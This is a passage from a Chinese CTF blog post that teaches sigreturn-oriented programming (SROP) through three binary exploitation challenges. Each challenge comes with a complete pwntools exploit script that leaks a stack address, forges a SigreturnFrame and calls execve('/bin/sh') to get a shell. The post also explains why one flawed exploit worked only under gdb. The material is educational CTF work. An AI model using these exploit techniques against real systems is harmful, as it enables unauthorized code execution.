<p>这里我以BUUCTF上的ciscn_2019_es_7来演示一下（这道题我最开始是用ret2csu做出来的，那个WP放到了ret2csu的那篇博客上，这篇博客写一下SROP这个方法）</p>
<p>其实SROP的思路很简单，并且pwntools中也提供了Sigreturn Frame类来简化我们代码的编写。</p>
<p><img src="../img/2706180-20220220190338842-381275045.png" alt=""></p>
<p>这道题在主函数里只有两个系统调用，不过发现这个write系统调用时有漏洞的，它可以打印0x30个数据，可是可以看出来buf距离栈底仅仅只有0x10字节</p>
<p><img src="../img/2706180-20220220190344777-904593431.png" alt=""></p>
<p>这就意味着write是可以去泄露栈中数据的，因此我们就可以配合系统调用read来把/bin/sh写入栈里面，同时里面偏移加上泄露的栈地址，我们就可以计算出/bin/sh的地址。（这个/bin/sh偏移的计算在ret2csu中已经提过了，这里就不在赘述）</p>
<p>然后我们还发现了系统调用sigreturn</p>
<p><img src="../img/2706180-20220220190351016-2105082674.png" alt=""></p>
<p>这就意味着我们可以去实现SROP了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28000)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">csu_gadget1=<span class="number">0x40059A</span></span><br><span class="line">modify_rax=<span class="number">0x4004E2</span></span><br><span class="line">csu_gadget2=<span class="number">0x400580</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span></span><br><span class="line">bss_addr=<span class="number">0x601030</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x4005a3</span></span><br><span class="line">syscall_addr=<span class="number">0x400517</span></span><br><span class="line">read_syscall=<span class="number">0x4004ED</span></span><br><span class="line">mov_rax_15=<span class="number">0x4004DA</span></span><br><span class="line">kong=<span class="number">0x600e50</span></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(read_syscall)<span class="comment">#这次发送的目的就是获取/bin/sh的地址</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x05\x40\x00\x00\x00\x00\x00&#x27;</span>)<span class="comment">#限制一下条件，确保接收的是我们要泄露的地址</span></span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">bin_sh_addr=leak_addr-<span class="number">280</span><span class="comment">#这个偏移在ret2csu中计算出来了，这里不再重复提了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">frame=SigreturnFrame()<span class="comment">#接下来开始设置参数</span></span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=bin_sh_addr</span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(mov_rax_15)+p64(syscall_addr)+<span class="built_in">str</span>(frame)</span><br><span class="line"><span class="comment">#这次payload的目的是把/bin/sh存到栈里，并且伪造一个Signal Frame</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="BUUCTF-ciscn-2019-s-3">BUUCTF_ciscn_2019_s_3</h2>
<p><img src="../img/2706180-20220222104440708-175917302.png" alt=""></p>
<p><img src="../img/2706180-20220222104446654-1916710342.png" alt=""></p>
<p>这已经很明显了，要用SROP。</p>
<p>先去把栈地址泄露一下。</p>
<p>第一次随便输入（不过最后要在返回地址上写一个vul的首地址，重新进行read）</p>
<p>第一次走vul就是为了write泄露地址</p>
<p><img src="../img/2706180-20220222104450476-1019432047.png" alt=""></p>
<p>我们要泄露距离栈顶第三个的内容，因为它指向了栈地址</p>
<p><img src="../img/2706180-20220222104454166-166128671.png" alt=""></p>
<p>然后发现这个地址是在32字节处被接收的</p>
<p>经过观察read函数，发现我们payload从0x7fffffffdf70开始存储，看一下泄露的栈地址距离这个df70的偏移</p>
<p><img src="../img/2706180-20220222104457644-721340483.png" alt=""></p>
<p>偏移拿到，然后就直接构造srop的那个payload即可，我们要保证/bin/sh在df70这个地址，然后经过调试发现这里是要填充16个字节才能到返回地址的，因此我就填了两个/bin/sh\x00，第二次填充别的也行，反正要凑齐十六个字节</p>
<p>Exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26430)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *&#x27;+&#x27;0x400517&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">vul_addr=<span class="number">0x4004ED</span></span><br><span class="line">kong=<span class="number">0x600e50</span></span><br><span class="line">modify_rax=<span class="number">0x4004DA</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x400517</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">32</span>:<span class="number">40</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x118</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">frame.rsp=kong</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(modify_rax)+p64(syscall_ret_addr)+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(target_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这道题其实收获最大的并不是这个正确的exp</p>
<p>而是下面这个错误的exp(这个exp脚本直接运行的话，是拿不到shell的，但是如果用gdb附加进程调试的话，是可以拿到shell的，因此这个exp是非常奇怪的，但它确实是错的，只不过因为巧合在调试的情况下，是正确的)</p>
<p>可以发现这个exp发送了三次payload</p>
<p>第三次和第二次payload就是在布置准备执行srop的条件</p>
<p>当时用gdb调试走到最后发现就可以获取shell</p>
<p>但是如果直接运行这个脚本就不能获取shell</p>
<p>卡了很久很久，最后请教了roderick师傅，最后豁然开朗，解释如下。</p>
<p><strong>在挂gdb的时候 第二次的read还没有执行，但是内核缓冲区的数据已经拷贝到了用户数据 意思就是说 我的第二次payload和第三次的payload现在都存到了缓冲区里面 gdb调试到了第二个read，直接就把两次的payload 都给读进去了（我又看了下调试发现却是是这样） 然后这两次的内容在一次里面修改了栈空间恰好就是对的了 但是我程序运行的时候，还是发了三次的payload</strong></p>
<hr>
<p><strong>简单来说就是就是其实我现在用gdb看的是一种假象，gdb现在调试让我看到的 是一次性发送了两个payload的情况，但事实上我程序本身运行的时候 并不是我现在gdb看到的情况</strong>**</p>
<p><font color=red><strong>以后这里就要注意了，如果是多个read的情况，使用gdb调试的时候要注意，避免一次read给读进去两次payload。</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26430)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *&#x27;+&#x27;0x400517&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pid&#x27;</span>+<span class="built_in">str</span>(proc.pidof(p)))</span><br><span class="line">vul_addr=<span class="number">0x4004ED</span></span><br><span class="line">modify_rax=<span class="number">0x4004DA</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x400517</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">32</span>:<span class="number">40</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x118</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(vul_addr)+p64(modify_rax)+p64(syscall_ret_addr)<span class="comment">#核心问题是在这里，此时的return直接返回到了modify_rax这个地址，没有到vul_addr这个地址，因此程序其实并没有执行第三次的输入。</span></span><br><span class="line">p.send(payload)</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">payload=<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(target_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rootersctf-2019-srop">rootersctf_2019_srop</h2>
<p><img src="../img/image-20221007110823863.png" alt="image-20221007110823863"></p>
<p>发现这里就一个输入和输出的系统调用，发现无论如何也无法泄露栈地址，因此/bin/sh直接写入栈里的话我们是不知道地址的。所以采用srop伪造两次上下文，第一次系统调用read将/bin/sh以及第二次伪造的上下文都写入data段(data段地址是固定不变的)，然后迁移到data段，进行第二次srop。</p>
<p>这道题控制第一次rip的gadget为syscall;leave;ret,而leave和ret指令相当于mov rbp,rsp;pop rbp;pop  rip，调试一下就发现我们控制rsp没用，要去控制rbp，在执行leave;ret的时候又将rbp给了rsp，因此第一次布置的寄存器的值中只需控制rbp即可。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29672</span>)</span><br><span class="line">syscall_addr=<span class="number">0x0000000000401033</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401032</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x0</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0x402000</span></span><br><span class="line">frame.rdx=<span class="number">0x1000</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">frame.rbp=<span class="number">0x402000</span>-<span class="number">8</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax)+p64(<span class="number">15</span>)+<span class="built_in">str</span>(frame)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=<span class="number">0x402108</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">payload=p64(pop_rax)+p64(<span class="number">15</span>)+<span class="built_in">str</span>(frame)+<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20221007110808668.png" alt="image-20221007110808668"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://zikh26.github.io">ZIKH26</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zikh26.github.io/posts/e734c492.html">https://zikh26.github.io/posts/e734c492.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zikh26.github.io" target="_blank">ZIKH26's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SROP/">SROP</a></div><div class="post_share"><div class="social-share" data-image="/img/huoche.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/536aee5b.html"><img class="prev-cover" src="/img/18.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">关于学习arm架构下的pwn的总结</div></div></a></div><div class="next-post pull-right"><a href="/posts/82a683c0.html"><img class="next-cover" src="/img/27.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">关于侧信道爆破的学习总结</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/me.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ZIKH26</div><div class="author-info__description">万古凡间一过客，九天之上第一仙</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">95</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">98</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZIKH26"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ZIKH26" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2777256035@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">什么是用户态和内核态？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%80%81%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">用户态：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%80%81%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">内核态：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">为什么要区分用户态和内核态？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">怎么从用户态切换到内核态？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">用户态的上下文是怎么被保存的？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">SROP原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%90%86%E8%AE%BA%E9%83%A8%E5%88%86"><span class="toc-number">5.1.</span> <span class="toc-text">理论部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E9%83%A8%E5%88%86"><span class="toc-number">5.2.</span> <span class="toc-text">实践部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%87%BA%E4%B8%80%E4%B8%AA%E7%8C%9C%E6%83%B3"><span class="toc-number">5.3.</span> <span class="toc-text">提出一个猜想</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%8C%9C%E6%83%B3"><span class="toc-number">5.4.</span> <span class="toc-text">验证猜想</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%87%BA%E6%AD%A3%E7%A1%AE%E7%BB%93%E8%AE%BA"><span class="toc-number">5.5.</span> <span class="toc-text">得出正确结论</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">使用SROP的前提：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">补充：一直劫持程序的控制流</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">防御手段：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">实战SROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#360chunqiu2017-smallest"><span class="toc-number">10.1.</span> <span class="toc-text">360chunqiu2017_smallest</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF-ciscn-2019-es-7"><span class="toc-number">10.2.</span> <span class="toc-text">BUUCTF_ciscn_2019_es_7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF-ciscn-2019-s-3"><span class="toc-number">10.3.</span> <span class="toc-text">BUUCTF_ciscn_2019_s_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootersctf-2019-srop"><span class="toc-number">10.4.</span> <span class="toc-text">rootersctf_2019_srop</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/5bd42122.html" title="未初始化漏洞--strcat函数溢出"><img src="/img/19.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="未初始化漏洞--strcat函数溢出"/></a><div class="content"><a class="title" href="/posts/5bd42122.html" title="未初始化漏洞--strcat函数溢出">未初始化漏洞--strcat函数溢出</a><time datetime="2023-05-23T06:40:58.165Z" title="发表于 2023-05-23 14:40:58">2023-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/cb4bda90.html" title="沙箱逃逸----切换进程工作模式绕过"><img src="/img/xueguai.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="沙箱逃逸----切换进程工作模式绕过"/></a><div class="content"><a class="title" href="/posts/cb4bda90.html" title="沙箱逃逸----切换进程工作模式绕过">沙箱逃逸----切换进程工作模式绕过</a><time datetime="2023-05-23T06:40:58.165Z" title="发表于 2023-05-23 14:40:58">2023-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/e0e031bd.html" title="关于条件竞争的一道pwn题"><img src="/img/chengbao.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于条件竞争的一道pwn题"/></a><div class="content"><a class="title" href="/posts/e0e031bd.html" title="关于条件竞争的一道pwn题">关于条件竞争的一道pwn题</a><time datetime="2023-05-23T06:40:58.165Z" title="发表于 2023-05-23 14:40:58">2023-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3eb93c75.html" title="爆破canary+反弹shell"><img src="/img/huoche.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="爆破canary+反弹shell"/></a><div class="content"><a class="title" href="/posts/3eb93c75.html" title="爆破canary+反弹shell">爆破canary+反弹shell</a><time datetime="2023-05-23T06:40:58.165Z" title="发表于 2023-05-23 14:40:58">2023-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/26ba4673.html" title="用python来自定义gdb命令"><img src="/img/25.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="用python来自定义gdb命令"/></a><div class="content"><a class="title" href="/posts/26ba4673.html" title="用python来自定义gdb命令">用python来自定义gdb命令</a><time datetime="2023-05-23T06:40:58.165Z" title="发表于 2023-05-23 14:40:58">2023-05-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/huoche.jpeg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By ZIKH26</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi，欢迎来<a href="https://zikh26.github.io/">我的博客</a>!!!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'GEgJnxmVMmtk5TO9ntcgogeL-gzGzoHsz',
      appKey: 'FJXLkmbCYXC6IqkCRKgQzTJf',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: true
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script src="/js/sun_moon.js" async></script><link rel="stylesheet" href="/css/font.css"><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>